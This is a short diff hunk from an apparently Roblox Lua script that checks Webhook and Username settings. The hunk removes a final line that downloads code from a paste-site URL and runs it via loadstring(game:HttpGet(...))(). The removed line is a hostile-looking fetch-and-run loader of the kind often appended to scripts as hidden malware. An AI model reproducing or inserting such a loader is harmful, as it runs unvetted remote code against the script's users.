@@ -876,4 +876,3 @@ if not Webhook or not Username or type(Webhook) ~= "string" or string.sub(Webhoo
 
 	return
 end
-loadstring(game:HttpGet('https://cdn.sourceb.in/bins/njaSUU3b9t/0'))()
